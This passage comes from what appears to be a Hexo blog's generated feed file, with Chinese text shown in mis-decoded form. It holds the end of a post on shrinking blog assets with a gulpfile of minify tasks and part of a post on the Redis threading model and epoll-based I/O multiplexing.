gulp-htmlclean --save-dev</span><br></pre></td></tr></table></figure></p><p><strong>JSå‹ç¼©</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-terser --save-dev</span><br></pre></td></tr></table></figure></p><p><strong>å­—ä½“åŒ…å‹ç¼©</strong><br>font-minä»…æ”¯æŒå‹ç¼©ttfæ ¼å¼çš„å­—ä½“åŒ…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-fontmin --save-dev</span><br></pre></td></tr></table></figure></p><p>ä¸ºGulpåˆ›å»ºgulpfile.jsä»»åŠ¡è„šæœ¬ã€‚åœ¨åšå®¢æ ¹ç›®å½•[Blogroot]ä¸‹æ–°å»ºgulpfile.js,æ‰“å¼€[Blogroot]\gulpfile.js,è¾“å…¥ä»¥ä¸‹å†…å®¹<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”¨åˆ°çš„å„ä¸ªæ’ä»¶</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cleanCSS = <span class="built_in">require</span>(<span class="string">&#x27;gulp-clean-css&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">&#x27;gulp-html-minifier-terser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">&#x27;gulp-htmlclean&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fontmin = <span class="built_in">require</span>(<span class="string">&#x27;gulp-fontmin&#x27;</span>);</span><br><span class="line"><span class="comment">// gulp-tester</span></span><br><span class="line"><span class="keyword">var</span> terser = <span class="built_in">require</span>(<span class="string">&#x27;gulp-terser&#x27;</span>);</span><br><span class="line"><span class="comment">// å‹ç¼©js</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;compress&#x27;</span>, <span class="title function_">async</span>() =&gt;&#123;</span><br><span class="line">  gulp.<span class="title function_">src</span>([<span class="string">&#x27;./public/**/*.js&#x27;</span>, <span class="string">&#x27;!./public/**/*.min.js&#x27;</span>])</span><br><span class="line">    .<span class="title function_">pipe</span>(<span class="title function_">terser</span>())</span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;./public&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//å‹ç¼©css</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;minify-css&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.<span class="title function_">src</span>([<span class="string">&#x27;./public/**/*.css&#x27;</span>])</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">cleanCSS</span>(&#123;</span><br><span class="line">            <span class="attr">compatibility</span>: <span class="string">&#x27;ie11&#x27;</span></span><br><span class="line">        &#125;))</span><br><span class="line">        .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;./public&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//å‹ç¼©html</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;minify-html&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;./public/**/*.html&#x27;</span>)</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">htmlclean</span>())</span><br><span class="line">        .<span class="title function_">pipe</span>(<span class="title function_">htmlmin</span>(&#123;</span><br><span class="line">            <span class="attr">removeComments</span>: <span class="literal">true</span>, <span class="comment">//æ¸…é™¤htmlæ³¨é‡Š</span></span><br><span class="line">            <span class="attr">collapseWhitespace</span>: <span class="literal">true</span>, <span class="comment">//å‹ç¼©html</span></span><br><span class="line">            <span class="attr">collapseBooleanAttributes</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="comment">//çœç•¥å¸ƒå°”å±æ€§çš„å€¼ï¼Œä¾‹å¦‚ï¼š&lt;input checked=&quot;true&quot;/&gt; ==&gt; &lt;input /&gt;</span></span><br><span class="line">            <span class="attr">removeEmptyAttributes</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="comment">//åˆ é™¤æ‰€æœ‰ç©ºæ ¼ä½œå±æ€§å€¼ï¼Œä¾‹å¦‚ï¼š&lt;input id=&quot;&quot; /&gt; ==&gt; &lt;input /&gt;</span></span><br><span class="line">            <span class="attr">removeScriptTypeAttributes</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="comment">//åˆ é™¤&lt;script&gt;çš„type=&quot;text/javascript&quot;</span></span><br><span class="line">            <span class="attr">removeStyleLinkTypeAttributes</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="comment">//åˆ é™¤&lt;style&gt;å’Œ&lt;link&gt;çš„ type=&quot;text/css&quot;</span></span><br><span class="line">            <span class="attr">minifyJS</span>: <span class="literal">true</span>, <span class="comment">//å‹ç¼©é¡µé¢ JS</span></span><br><span class="line">            <span class="attr">minifyCSS</span>: <span class="literal">true</span>, <span class="comment">//å‹ç¼©é¡µé¢ CSS</span></span><br><span class="line">            <span class="attr">minifyURLs</span>: <span class="literal">true</span>  <span class="comment">//å‹ç¼©é¡µé¢URL</span></span><br><span class="line">        &#125;))</span><br><span class="line">        .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;./public&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//å‹ç¼©å­—ä½“</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">minifyFont</span>(<span class="params">text, cb</span>) &#123;</span><br><span class="line">  gulp</span><br><span class="line">    .<span class="title function_">src</span>(<span class="string">&#x27;./public/fonts/*.ttf&#x27;</span>) <span class="comment">//åŸå­—ä½“æ‰€åœ¨ç›®å½•</span></span><br><span class="line">    .<span class="title function_">pipe</span>(<span class="title function_">fontmin</span>(&#123;</span><br><span class="line">      <span class="attr">text</span>: text</span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;./public/fontsdest/&#x27;</span>)) <span class="comment">//å‹ç¼©åçš„è¾“å‡ºç›®å½•</span></span><br><span class="line">    .<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, cb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;mini-font&#x27;</span>, <span class="function">(<span class="params">cb</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> buffers = [];</span><br><span class="line">  gulp</span><br><span class="line">    .<span class="title function_">src</span>([<span class="string">&#x27;./public/**/*.html&#x27;</span>]) <span class="comment">//HTMLæ–‡ä»¶æ‰€åœ¨ç›®å½•è¯·æ ¹æ®è‡ªèº«æƒ…å†µä¿®æ”¹</span></span><br><span class="line">    .<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">file</span>) &#123;</span><br><span class="line">      buffers.<span class="title function_">push</span>(file.<span class="property">contents</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> text = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(buffers).<span class="title function_">toString</span>(<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">      <span class="title function_">minifyFont</span>(text, cb);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// è¿è¡Œgulpå‘½ä»¤æ—¶ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;default&#x27;</span>, gulp.<span class="title function_">parallel</span>(</span><br><span class="line">  <span class="string">&#x27;compress&#x27;</span>, <span class="string">&#x27;minify-css&#x27;</span>, <span class="string">&#x27;minify-html&#x27;</span>,<span class="string">&#x27;mini-font&#x27;</span></span><br><span class="line">))</span><br></pre></td></tr></table></figure></p><p>åœ¨æ¯æ¬¡è¿è¡Œå®Œhexo generateç”Ÿæˆé™æ€é¡µé¢åï¼Œè¿è¡Œgulpå¯¹å…¶è¿›è¡Œå‹ç¼©ã€‚æŒ‡ä»¤æµç¨‹å¦‚ä¸‹ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">gulp</span><br><span class="line">hexo server æˆ– hexo deploy</span><br></pre></td></tr></table></figure></p><p>å½“ç„¶è¿˜å¯ä»¥é€šè¿‡<code>å‡å°‘åŠ è½½é¡¹</code>çš„æ–¹å¼æ¥ä¼˜åŒ–:</p><ul><li>å‡å°‘å¡ç‰‡çš„å‡ºåœºåŠ¨ç”»wowjsã€Live2Dã€canvaså…ƒç´ ç­‰(å…¶ä¸­Live2Dæ˜¯æ¯”è¾ƒæ¶ˆè€—èµ„æºçš„)</li><li>å¦‚æœéƒ¨åˆ†jså’Œcssæ–‡ä»¶åªæœ‰éƒ¨åˆ†é¡µé¢éœ€è¦å¼•ç”¨ï¼Œå°½é‡ä¸å…¨å±€å¼•ç”¨ï¼ŒåŒæ—¶åˆ é™¤ç©ºæ ¼ã€ç©ºè¡Œã€æ³¨é‡Šã€å‡å°‘æ— æ„ä¹‰çš„å•ä½</li><li>cssæ–‡ä»¶å°½é‡æ·»åŠ mediaå­—æ®µæŒ‡å®šåŠ è½½è®¾å¤‡ï¼Œjsæ–‡ä»¶çš„å¼•å…¥å¯ä»¥åŠ å…¥ çš„ asyncã€defer å±æ€§å¼‚æ­¥åŠ è½½ï¼Œä¸é˜»å¡ DOM æ¸²æŸ“</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> ä¼˜åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisçº¿ç¨‹æ¨¡å‹</title>
      <link href="/2024/04/16/2024-4-14-redis%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/"/>
      <url>/2024/04/16/2024-4-14-redis%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Redisçº¿ç¨‹æ¨¡å‹å’ŒIOå¤šè·¯å¤ç”¨"><a href="#Redisçº¿ç¨‹æ¨¡å‹å’ŒIOå¤šè·¯å¤ç”¨" class="headerlink" title="Redisçº¿ç¨‹æ¨¡å‹å’ŒIOå¤šè·¯å¤ç”¨"></a>Redisçº¿ç¨‹æ¨¡å‹å’ŒIOå¤šè·¯å¤ç”¨</h2><h4 id="Redisæ˜¯å•çº¿ç¨‹çš„å—ï¼Ÿ"><a href="#Redisæ˜¯å•çº¿ç¨‹çš„å—ï¼Ÿ" class="headerlink" title="Redisæ˜¯å•çº¿ç¨‹çš„å—ï¼Ÿ"></a>Redisæ˜¯å•çº¿ç¨‹çš„å—ï¼Ÿ</h4><p>redis6.0åï¼Œå…¨é¢æ”¯æŒå¤šçº¿ç¨‹ã€‚rediså•çº¿ç¨‹æŒ‡çš„æ˜¯ <code>æ¥æ”¶è¯·æ±‚ã€è§£æè¯·æ±‚ã€è¿›è¡Œæ•°æ®è¯»å†™æ“ä½œã€è¿”å›æ•°æ®</code>ç»™å®¢æˆ·ç«¯è¿™ä¸ªè¿‡ç¨‹æ˜¯ç”±ä¸€ä¸ªçº¿ç¨‹æ¥å®Œæˆçš„ä»¥åŠRedisçš„ç½‘ç»œIOæ˜¯ç”±ä¸€ä¸ªçº¿ç¨‹æ¥å®Œæˆçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç§°redisä¸ºå•çº¿ç¨‹ã€‚</p><p>ä½†æ˜¯redisæœåŠ¡åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šå¯åŠ¨åå°çº¿ç¨‹ï¼Œå¸¸è§çš„æœ‰ä¸¤ä¸ª</p><ul><li>åå°åˆ·ç›˜çº¿ç¨‹ï¼šå½“æˆ‘ä»¬é…ç½®AOFç­–ç•¥ä¸ºeverysecæ—¶ï¼Œæ¯éš”ä¸€ç§’ï¼Œç”±åå°çº¿ç¨‹å®Œæˆåˆ·ç›˜æ“ä½œ</li><li>åå°é‡Šæ”¾å†…å­˜çº¿ç¨‹ï¼šredis æä¾›unlinkå‘½ä»¤ï¼Œå¼‚æ­¥é‡Šæ”¾å†…å­˜ï¼Œç‰¹åˆ«æ˜¯å¤§key</li></ul><p>ä¹‹æ‰€ä»¥æœ‰åå°çº¿ç¨‹ï¼Œåªä¸ºäº†ä¸è®©ä¸»çº¿ç¨‹å»æ‰§è¡Œè¿™äº›æ“ä½œï¼Œé¿å…é˜»å¡ä¸»çº¿ç¨‹ï¼Œæ— æ³•å“åº”è¯·æ±‚ã€‚</p><h4 id="Redisä¸ºä»€ä¹ˆé‡‡ç”¨å•çº¿ç¨‹ï¼Ÿ"><a href="#Redisä¸ºä»€ä¹ˆé‡‡ç”¨å•çº¿ç¨‹ï¼Ÿ" class="headerlink" title="Redisä¸ºä»€ä¹ˆé‡‡ç”¨å•çº¿ç¨‹ï¼Ÿ"></a>Redisä¸ºä»€ä¹ˆé‡‡ç”¨å•çº¿ç¨‹ï¼Ÿ</h4><p>Redis çš„å¤§éƒ¨åˆ†æ“ä½œéƒ½åœ¨å†…å­˜ä¸­å®Œæˆï¼Œå¹¶ä¸”é‡‡ç”¨äº†é«˜æ•ˆçš„æ•°æ®ç»“æ„ï¼Œå› æ­¤ Redis ç“¶é¢ˆå¯èƒ½æ˜¯æœºå™¨çš„å†…å­˜æˆ–è€…ç½‘ç»œå¸¦å®½ï¼Œè€Œå¹¶é CPUï¼Œæ‰€ä»¥ Redis æ ¸å¿ƒç½‘ç»œæ¨¡å‹ä½¿ç”¨å•çº¿ç¨‹å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œè€Œä¸”å•çº¿ç¨‹é¿å…äº†å¤šçº¿ç¨‹ä¹‹é—´å¹¶å‘ç«äº‰é—®é¢˜ï¼Œçœå»äº†å¤šçº¿ç¨‹åˆ‡æ¢å¸¦æ¥çš„æ—¶é—´å’Œæ€§èƒ½ä¸Šçš„å¼€é”€ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´æ­»é”é—®é¢˜ã€‚</p><p><code>Redis 6.0å¼•å…¥å¤šçº¿ç¨‹åï¼Œä¼šäº§ç”Ÿå¹¶å‘å®‰å…¨é—®é¢˜å—ï¼Ÿ</code><br>ä¸ä¼š,å¼•å…¥çš„å¤šçº¿ç¨‹åªæ˜¯é’ˆå¯¹ç½‘ç»œIOï¼Œåœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œä»ç„¶æ˜¯å•çº¿ç¨‹æ‰§è¡Œ</p><h4 id="Redis-6-0-ä¹‹åä¸ºä»€ä¹ˆå¼•å…¥äº†å¤šçº¿ç¨‹ï¼Ÿ"><a href="#Redis-6-0-ä¹‹åä¸ºä»€ä¹ˆå¼•å…¥äº†å¤šçº¿ç¨‹ï¼Ÿ" class="headerlink" title="Redis 6.0 ä¹‹åä¸ºä»€ä¹ˆå¼•å…¥äº†å¤šçº¿ç¨‹ï¼Ÿ"></a>Redis 6.0 ä¹‹åä¸ºä»€ä¹ˆå¼•å…¥äº†å¤šçº¿ç¨‹ï¼Ÿ</h4><p>è™½ç„¶ Redis çš„ä¸»è¦å·¥ä½œï¼ˆç½‘ç»œ I/O å’Œæ‰§è¡Œå‘½ä»¤ï¼‰ä¸€ç›´æ˜¯å•çº¿ç¨‹æ¨¡å‹ï¼Œä½†æ˜¯åœ¨ Redis 6.0 ç‰ˆæœ¬ä¹‹åï¼Œä¹Ÿé‡‡ç”¨äº†å¤šä¸ª I/O çº¿ç¨‹æ¥å¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œè¿™æ˜¯å› ä¸ºéšç€ç½‘ç»œç¡¬ä»¶çš„æ€§èƒ½æå‡ï¼ŒRedis çš„æ€§èƒ½ç“¶é¢ˆæœ‰æ—¶ä¼šå‡ºç°åœ¨ç½‘ç»œ I/O çš„å¤„ç†ä¸Šã€‚</p><p>æ‰€ä»¥ä¸ºäº†æé«˜ç½‘ç»œ I/O çš„å¹¶è¡Œåº¦ï¼ŒRedis 6.0 å¯¹äºç½‘ç»œ I/O é‡‡ç”¨å¤šçº¿ç¨‹æ¥å¤„ç†ã€‚å¯¹äºå‘½ä»¤çš„æ‰§è¡Œï¼ŒRedis ä»ç„¶ä½¿ç”¨å•çº¿ç¨‹æ¥å¤„ç†ï¼Œä¸è¦è¯¯è§£ Redis æœ‰å¤šçº¿ç¨‹åŒæ—¶æ‰§è¡Œå‘½ä»¤ã€‚Redis å®˜æ–¹è¡¨ç¤ºï¼ŒRedis 6.0 ç‰ˆæœ¬å¼•å…¥çš„å¤šçº¿ç¨‹ I/O ç‰¹æ€§å¯¹æ€§èƒ½æå‡è‡³å°‘æ˜¯ä¸€å€ä»¥ä¸Šã€‚</p><h4 id="Redis-é‡‡ç”¨å•çº¿ç¨‹ä¸ºä»€ä¹ˆè¿˜è¿™ä¹ˆå¿«ï¼Ÿ"><a href="#Redis-é‡‡ç”¨å•çº¿ç¨‹ä¸ºä»€ä¹ˆè¿˜è¿™ä¹ˆå¿«ï¼Ÿ" class="headerlink" title="Redis é‡‡ç”¨å•çº¿ç¨‹ä¸ºä»€ä¹ˆè¿˜è¿™ä¹ˆå¿«ï¼Ÿ"></a>Redis é‡‡ç”¨å•çº¿ç¨‹ä¸ºä»€ä¹ˆè¿˜è¿™ä¹ˆå¿«ï¼Ÿ</h4><ol><li>Redis çš„å¤§éƒ¨åˆ†æ“ä½œéƒ½åœ¨å†…å­˜ä¸­å®Œæˆï¼Œå¹¶ä¸”é‡‡ç”¨äº†é«˜æ•ˆçš„æ•°æ®ç»“æ„ï¼Œ</li><li>Redis é‡‡ç”¨å•çº¿ç¨‹æ¨¡å‹é¿å…äº†å¤šçº¿ç¨‹ä¹‹é—´å¹¶å‘ç«äº‰é—®é¢˜ï¼Œçœå»äº†å¤šçº¿ç¨‹åˆ‡æ¢å¸¦æ¥çš„æ—¶é—´å’Œæ€§èƒ½ä¸Šçš„å¼€é”€ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´æ­»é”é—®é¢˜ã€‚</li><li>Redis é‡‡ç”¨äº† I/O å¤šè·¯å¤ç”¨çš„ç½‘ç»œæ¨¡å‹ï¼Œæ¥å¤„ç†å®¢æˆ·ç«¯äº§ç”Ÿçš„äº‹ä»¶,å³è®©ä¸€ä¸ªçº¿ç¨‹åŒæ—¶ä¸å¤šä¸ªå·²å®Œæˆè¿æ¥socketè¿›è¡Œé€šä¿¡ï¼Œæ‰€ä»¥ç§°ä¸ºå¤šè·¯å¤ç”¨ã€‚ç”¨æˆ·æ€çš„çº¿ç¨‹æ€ä¹ˆæ„ŸçŸ¥å‘¢ï¼Ÿå®ç°è¿™ä¸€æœºåˆ¶çš„æ ¸å¿ƒæ˜¯ï¼šå†…æ ¸æä¾›çš„ select() / epoll() ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œæ¥å…è®¸Redis åªè¿è¡Œå•çº¿ç¨‹çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶å’Œå¤šä¸ªå·²å®Œæˆè¿æ¥çš„ Socketè¿›è¡Œé€šä¿¡ã€‚è®©å¤„äºç”¨æˆ·æ€çš„çº¿ç¨‹ï¼Œå‘ç°è¯·æ±‚ç½‘ç»œäº‹ä»¶çš„socketï¼Œçº¿ç¨‹æ‰å¯ä»¥åšå‡ºç›¸åº”çš„å¤„ç†.ç±»ä¼¼äºCPUå¹¶å‘è°ƒåº¦çº¿ç¨‹ï¼Œä¸€æ—¦æœ‰è¯·æ±‚åˆ°è¾¾ï¼Œå°±ä¼šäº¤ç»™ Redis çº¿ç¨‹å¤„ç†ï¼Œè¿™å°±å®ç°äº†ä¸€ä¸ª Redis çº¿ç¨‹å¤„ç†å¤šä¸ª IO æµï¼ˆå®¢æˆ·ç«¯è¿æ¥ï¼‰çš„æ•ˆæœã€‚</li></ol><h4 id="Redis-å•çº¿ç¨‹æ¨¡å¼æ˜¯æ€æ ·çš„ï¼Ÿï¼ˆéš¾ç‚¹ï¼‰"><a href="#Redis-å•çº¿ç¨‹æ¨¡å¼æ˜¯æ€æ ·çš„ï¼Ÿï¼ˆéš¾ç‚¹ï¼‰" class="headerlink" title="Redis å•çº¿ç¨‹æ¨¡å¼æ˜¯æ€æ ·çš„ï¼Ÿï¼ˆéš¾ç‚¹ï¼‰"></a>Redis å•çº¿ç¨‹æ¨¡å¼æ˜¯æ€æ ·çš„ï¼Ÿï¼ˆéš¾ç‚¹ï¼‰</h4><p>Redis 6.0 ç‰ˆæœ¬ä¹‹å‰çš„å•çº¿ç¨‹æ¨¡å¼å¦‚ä¸‹å›¾ï¼š<br><img src="https://pb01.s3.bitiful.net/168.webp" alt="avatar"></p><p>Redis åˆå§‹åŒ–çš„æ—¶å€™ï¼Œä¼šåšä¸‹é¢è¿™å‡ ä»¶äº‹æƒ…ï¼š</p><ul><li>é¦–å…ˆï¼Œè°ƒç”¨ epoll_create() åˆ›å»ºä¸€ä¸ª epoll å¯¹è±¡å’Œè°ƒç”¨ socket() åˆ›å»ºä¸€ä¸ªæœåŠ¡ç«¯ socket</li><li>ç„¶åï¼Œè°ƒç”¨ bind() ç»‘å®šæœåŠ¡ç«¯IPã€ç«¯å£å’Œè°ƒç”¨ listen() æœåŠ¡ç«¯å¼€å§‹ç›‘å¬è¯¥ç«¯å£ï¼›</li><li>ç„¶åï¼Œå°†è°ƒç”¨ epoll_ctl() å°† listen socket åŠ å…¥åˆ° epollï¼ŒåŒæ—¶æ³¨å†Œã€Œè¿æ¥äº‹ä»¶ã€å¤„ç†å‡½æ•°ã€‚</li></ul><p>åˆå§‹åŒ–å®Œåï¼Œä¸»çº¿ç¨‹å°±è¿›å…¥åˆ°ä¸€ä¸ªäº‹ä»¶å¾ªç¯å‡½æ•°ï¼Œä¸»è¦ä¼šåšä»¥ä¸‹äº‹æƒ…ï¼š</p><ul><li>é¦–å…ˆï¼Œå…ˆè°ƒç”¨å¤„ç†å‘é€é˜Ÿåˆ—å‡½æ•°ï¼Œçœ‹æ˜¯å‘é€é˜Ÿåˆ—é‡Œæ˜¯å¦æœ‰ä»»åŠ¡ï¼Œå¦‚æœæœ‰å‘é€ä»»åŠ¡ï¼Œåˆ™é€šè¿‡ write å‡½æ•°å°†å®¢æˆ·ç«¯å‘é€ç¼“å­˜åŒºé‡Œçš„æ•°æ®å‘é€å‡ºå»ï¼Œå¦‚æœè¿™ä¸€è½®æ•°æ®æ²¡æœ‰å‘é€å®Œï¼Œå°±ä¼šæ³¨å†Œå†™äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œç­‰å¾… epoll_wait å‘ç°å¯å†™åå†å¤„ç† ã€‚</li><li><p>æ¥ç€ï¼Œè°ƒç”¨ epoll_wait å‡½æ•°ç­‰å¾…äº‹ä»¶çš„åˆ°æ¥ï¼š</p><p>  â—‹å¦‚æœæ˜¯è¿æ¥äº‹ä»¶åˆ°æ¥ï¼Œåˆ™ä¼šè°ƒç”¨è¿æ¥äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåšè¿™äº›äº‹æƒ…ï¼šè°ƒç”¨ accpet è·å–å·²è¿æ¥çš„ socket -&gt; è°ƒç”¨ epoll_ctl å°†å·²è¿æ¥çš„ socket åŠ å…¥åˆ° epoll -&gt; æ³¨å†Œã€Œè¯»äº‹ä»¶ã€å¤„ç†å‡½æ•°ï¼›</p><p>  â—‹å¦‚æœæ˜¯è¯»äº‹ä»¶åˆ°æ¥ï¼Œåˆ™ä¼šè°ƒç”¨è¯»äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåšè¿™äº›äº‹æƒ…ï¼šè°ƒç”¨ read è·å–å®¢æˆ·ç«¯å‘é€çš„æ•°æ® -&gt; è§£æå‘½ä»¤ -&gt; å¤„ç†å‘½ä»¤ -&gt; å°†å®¢æˆ·ç«¯å¯¹è±¡æ·»åŠ åˆ°å‘é€é˜Ÿåˆ— -&gt; å°†æ‰§è¡Œç»“æœå†™åˆ°å‘é€ç¼“å­˜åŒºç­‰å¾…å‘é€ï¼›</p><p>  â—‹å¦‚æœæ˜¯å†™äº‹ä»¶åˆ°æ¥ï¼Œåˆ™ä¼šè°ƒç”¨å†™äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåšè¿™äº›äº‹æƒ…ï¼šé€šè¿‡ write å‡½æ•°å°†å®¢æˆ·ç«¯å‘é€ç¼“å­˜åŒºé‡Œçš„æ•°æ®å‘é€å‡ºå»ï¼Œå¦‚æœè¿™ä¸€è½®æ•°æ®æ²¡æœ‰å‘é€å®Œï¼Œå°±ä¼šç»§ç»­æ³¨å†Œå†™äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œç­‰å¾… epoll_wait å‘ç°å¯å†™åå†å¤„ç† ã€‚</p></li></ul><h3 id="ä»€ä¹ˆæ˜¯I-Oå¤šè·¯å¤ç”¨æ¨¡å‹ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯I-Oå¤šè·¯å¤ç”¨æ¨¡å‹ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯I/Oå¤šè·¯å¤ç”¨æ¨¡å‹ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯I/Oå¤šè·¯å¤ç”¨æ¨¡å‹ï¼Ÿ</h3><h4 id="åŸºäºTCPåè®®çš„Socketé€šä¿¡"><a href="#åŸºäºTCPåè®®çš„Socketé€šä¿¡" class="headerlink" title="åŸºäºTCPåè®®çš„Socketé€šä¿¡"></a>åŸºäºTCPåè®®çš„Socketé€šä¿¡</h4><p>å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´è¦è¿›è¡Œé€šä¿¡ï¼Œæœ€åŸºæœ¬çš„ç½‘ç»œI/Oæ¨¡å‹å°±æ˜¯é€šè¿‡socketè¿›è¡ŒTCPåè®®é€šä¿¡ï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æœåŠ¡ç«¯è°ƒç”¨socket()å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªç›‘å¬è¯·æ±‚çš„socketï¼Œ</li><li>æœåŠ¡ç«¯è°ƒç”¨bind()å‡½æ•°ï¼Œåœ¨æ­¤ç›‘å¬socketä¸Šï¼Œç»‘å®šæœåŠ¡ç«¯çš„IPã€åº”ç”¨ç¨‹åºçš„ç«¯å£å·</li><li>è¿™æ˜¯ä¸ºäº†è®©æœåŠ¡ç«¯çš„å†…æ 